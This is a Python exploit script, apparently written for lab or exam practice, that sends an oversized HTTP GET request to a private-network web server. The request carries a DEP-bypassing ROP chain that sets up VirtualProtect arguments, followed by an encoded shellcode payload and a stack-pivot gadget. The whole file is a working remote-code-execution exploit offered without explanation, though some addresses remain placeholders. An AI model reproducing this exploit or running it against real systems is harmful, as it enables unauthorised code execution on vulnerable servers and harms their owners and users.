import socket
import os
import sys
import struct

def shellcode():
    buf =  b"\x90" * 100
    buf += b"\xbf\xe7\xe5\xa4\x95\xda\xca\xd9\x74\x24\xf4\x58"
    buf += b"\x31\xc9\xb1\x52\x31\x78\x12\x03\x78\x12\x83\x27"
    buf += b"\xe1\x46\x60\x5b\x02\x04\x8b\xa3\xd3\x69\x05\x46"
    buf += b"\xe2\xa9\x71\x03\x55\x1a\xf1\x41\x5a\xd1\x57\x71"
    buf += b"\xe9\x97\x7f\x76\x5a\x1d\xa6\xb9\x5b\x0e\x9a\xd8"
    buf += b"\xdf\x4d\xcf\x3a\xe1\x9d\x02\x3b\x26\xc3\xef\x69"
    buf += b"\xff\x8f\x42\x9d\x74\xc5\x5e\x16\xc6\xcb\xe6\xcb"
    buf += b"\x9f\xea\xc7\x5a\xab\xb4\xc7\x5d\x78\xcd\x41\x45"
    buf += b"\x9d\xe8\x18\xfe\x55\x86\x9a\xd6\xa7\x67\x30\x17"
    buf += b"\x08\x9a\x48\x50\xaf\x45\x3f\xa8\xd3\xf8\x38\x6f"
    buf += b"\xa9\x26\xcc\x6b\x09\xac\x76\x57\xab\x61\xe0\x1c"
    buf += b"\xa7\xce\x66\x7a\xa4\xd1\xab\xf1\xd0\x5a\x4a\xd5"
    buf += b"\x50\x18\x69\xf1\x39\xfa\x10\xa0\xe7\xad\x2d\xb2"
    buf += b"\x47\x11\x88\xb9\x6a\x46\xa1\xe0\xe2\xab\x88\x1a"
    buf += b"\xf3\xa3\x9b\x69\xc1\x6c\x30\xe5\x69\xe4\x9e\xf2"
    buf += b"\x8e\xdf\x67\x6c\x71\xe0\x97\xa5\xb6\xb4\xc7\xdd"
    buf += b"\x1f\xb5\x83\x1d\x9f\x60\x03\x4d\x0f\xdb\xe4\x3d"
    buf += b"\xef\x8b\x8c\x57\xe0\xf4\xad\x58\x2a\x9d\x44\xa3"
    buf += b"\xbd\x62\x30\x86\xd4\x0b\x43\xd8\x37\x90\xca\x3e"
    buf += b"\x5d\x38\x9b\xe9\xca\xa1\x86\x61\x6a\x2d\x1d\x0c"
    buf += b"\xac\xa5\x92\xf1\x63\x4e\xde\xe1\x14\xbe\x95\x5b"
    buf += b"\xb2\xc1\x03\xf3\x58\x53\xc8\x03\x16\x48\x47\x54"
    buf += b"\x7f\xbe\x9e\x30\x6d\x99\x08\x26\x6c\x7f\x72\xe2"
    buf += b"\xab\xbc\x7d\xeb\x3e\xf8\x59\xfb\x86\x01\xe6\xaf"
    buf += b"\x56\x54\xb0\x19\x11\x0e\x72\xf3\xcb\xfd\xdc\x93"
    buf += b"\x8a\xcd\xde\xe5\x92\x1b\xa9\x09\x22\xf2\xec\x36"
    buf += b"\x8b\x92\xf8\x4f\xf1\x02\x06\x9a\xb1\x23\xe5\x0e"
    buf += b"\xcc\xcb\xb0\xdb\x6d\x96\x42\x36\xb1\xaf\xc0\xb2"
    buf += b"\x4a\x54\xd8\xb7\x4f\x10\x5e\x24\x22\x09\x0b\x4a"
    buf += b"\x91\x2a\x1e"
    return buf


ip = "192.168.165.10"
port = 80

CRASH_LEN = 5000  # change me
OFFSET = 4065  # change me

va = b""
va += struct.pack("<L", 0x45454545)                # VirtualProtect address
va += struct.pack("<L", 0x46464646)                # shellcode return address to return to after VirtualProtect is called
va += struct.pack("<L", 0x47474747)                # lpAddress (same as above)
va += struct.pack("<L", 0x48484848)                # dwSize         (size of shellcode, 0x300 or so)
va += struct.pack("<L", 0x49494949)                # flNewProtect   (0x40)
va += struct.pack("<L", 0x50505050)                # lpflOldProtect (some writable memory address)


offset_esp_1004 = 0x9b4
# \x00\x0e\x20\x2f\x5c\x24\x25

 #\x00\x0a\x0d\x20\x25\x2f\x5c

IAT = 0x61c832d0 
ROPNOP = 0x1001011a # ret  ;

gadgets = [
	0x1001fa03, # xor ecx, ecx ; cmp eax, 0xC0000005 ; sete cl ; mov eax, ecx ; ret  ;    ecx := 0, eax := 0
    0x61c05e8c, # xchg eax, ebp ; ret  ;                                                  swap(eax, ebp) ebp --> eax
    0x10022c40, # mov edx, eax ; xor eax, eax ; and cl, 0x0000001F ; shl edx, cl ; ret  ; edx := eax
    0x100238cc, # push esp ; and al, 0x10 ; pop esi ; mov dword [edx], ecx ; ret  ;        esi := esp, also mov dword [edx], ecx will not fail
    0x1001a3d4, # mov eax, esi ; pop esi ; ret  ;                                          eax : = esi
    0x41414141, # pop esi

    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;

    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;

    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;

    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;

    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;

    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;
	
    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;
	
    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;
	
    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;
	
    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;
    0x1001614d, # dec eax ; ret  ;
	
    0x10010102, # pop ecx ; ret  ;
	0xFFFFFFFF,
    0x1001fefb, # inc ecx ; mov dword [eax], ecx ; ret  ; ecx := 0
    0x10022c40, # mov edx, eax ; xor eax, eax ; and cl, 0x0000001F ; shl edx, cl ; ret  ; edx := eax

    0x10015442, # pop eax ; ret  ;
    IAT,
	0x1002248c, # mov eax, dword [eax] ; ret  ;

    0x1001bc36, # mov dword [edx], eax ; sub ecx, 0x00000100 ; sar ecx, 0x04 ; lea eax, dword [ecx+eax+0x08] ; ret  ;
	
    0x61c031cc, # inc edx ; or cl, cl ; ret  ;
	0x61c031cc, # inc edx ; or cl, cl ; ret  ;
	0x61c031cc, # inc edx ; or cl, cl ; ret  ;
	0x61c031cc, # inc edx ; or cl, cl ; ret  ;
	
    0x10012c29, # mov eax, edx ; pop ebx ; ret  ;
	0x41414141, # dummy for pop ebx
	
    # create a distance from current pointer to shellcode (empiric calculation)
    0x61c0779a, # add eax, 0x000001B8 ; add cl, cl ; ret  ;
	0x10019457, # add eax, 0x20 ; ret  ; 
	0x10019457, # add eax, 0x20 ; ret  ; 
	
    0x1001bc36, # mov dword [edx], eax ; sub ecx, 0x00000100 ; sar ecx, 0x04 ; lea eax, dword [ecx+eax+0x08] ; ret  ;
	# same distance calculation
	0x10012c29, # mov eax, edx ; pop ebx ; ret  ;
	0x41414141, # dummy for pop ebx
	
    0x61c0779a, # add eax, 0x000001B8 ; add cl, cl ; ret  ;
	0x10019457, # add eax, 0x20 ; ret  ; 
	0x10019457, # add eax, 0x20 ; ret  ;  
	
    0x61c031cc, # inc edx ; or cl, cl ; ret  ;
	0x61c031cc, # inc edx ; or cl, cl ; ret  ;
	0x61c031cc, # inc edx ; or cl, cl ; ret  ;
	0x61c031cc, # inc edx ; or cl, cl ; ret  ;
	
    0x1001bc36, # mov dword [edx], eax ; sub ecx, 0x00000100 ; sar ecx, 0x04 ; lea eax, dword [ecx+eax+0x08] ; ret  ;
	
    # dwSize         (size of shellcode, 0x300 or so)
	
    0x61c031cc, # inc edx ; or cl, cl ; ret  ;
	0x61c031cc, # inc edx ; or cl, cl ; ret  ;
	0x61c031cc, # inc edx ; or cl, cl ; ret  ;
	0x61c031cc, # inc edx ; or cl, cl ; ret  ;

    0x10015442, # pop eax ; ret  ;
    0xFFFFFFFF,
    0x100231d1, # neg eax ; ret  ;

    0x61c0779a, # add eax, 0x000001B8 ; add cl, cl ; ret  ;
    0x61c0779a, # add eax, 0x000001B8 ; add cl, cl ; ret  ;
	0x10019457, # add eax, 0x20 ; ret  ; 
	0x10019457, # add eax, 0x20 ; ret  ;  
    0x1001bc36, # mov dword [edx], eax ; sub ecx, 0x00000100 ; sar ecx, 0x04 ; lea eax, dword [ecx+eax+0x08] ; ret  ;

    # flNewProtect   (0x40)
    0x61c031cc, # inc edx ; or cl, cl ; ret  ;
	0x61c031cc, # inc edx ; or cl, cl ; ret  ;
	0x61c031cc, # inc edx ; or cl, cl ; ret  ;
	0x61c031cc, # inc edx ; or cl, cl ; ret  ;
	
    0x10015442, # pop eax ; ret  ;
    0xFFFFFFFF,
    0x10022199, # inc eax ; ret  ; eax := 0
	
    0x10019457, # add eax, 0x20 ; ret  ; 
	0x10019457, # add eax, 0x20 ; ret  ;  
    0x1001bc36, # mov dword [edx], eax ; sub ecx, 0x00000100 ; sar ecx, 0x04 ; lea eax, dword [ecx+eax+0x08] ; ret  ;
	
    # lpflOldProtect (some writable memory address)
	0x61c031cc, # inc edx ; or cl, cl ; ret  ;
	0x61c031cc, # inc edx ; or cl, cl ; ret  ;
	0x61c031cc, # inc edx ; or cl, cl ; ret  ;
	0x61c031cc, # inc edx ; or cl, cl ; ret  ;
	
    0x10015442, # pop eax ; ret  ;
    0x61c83004, # writable address
	0x1001bc36, # mov dword [edx], eax ; sub ecx, 0x00000100 ; sar ecx, 0x04 ; lea eax, dword [ecx+eax+0x08] ; ret  ;
	
    # move esp to start of VA
	
    0x10012c29, # mov eax, edx ; pop ebx ; ret  ;	
    0x41414141, # dummy for pop ebx
	
    0x10022897, # sub eax, 0x20 ; ret  ;
    0x1001aee5, # add eax, 0x08 ; ret  ;
    0x61c05e8c, # xchg eax, ebp ; ret  ;
	
    0x10013806, # mov esp, ebp ; pop ebp ; ret  ; 
	
]
# badchars = \x00\x20\x25\x2b\x2f\x5c

buffer = b""
for gadget in gadgets:
	buffer += struct.pack("<L", gadget)

print(hex(len(buffer)))
payload = b"A"
payload += b"B" * (offset_esp_1004 - len(va))
payload += va
payload += buffer
payload += shellcode()
payload += b"A" * (OFFSET - len(payload))
payload += struct.pack("<L", 0x10022877) # add esp, 0x00001004 ; ret  ;
payload += b"D" * (CRASH_LEN - len(payload))


buffer = b"GET "
buffer += payload
buffer += b" HTTP/1.1\r\n"

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((ip, port))
expl.send(buffer)
expl.close()
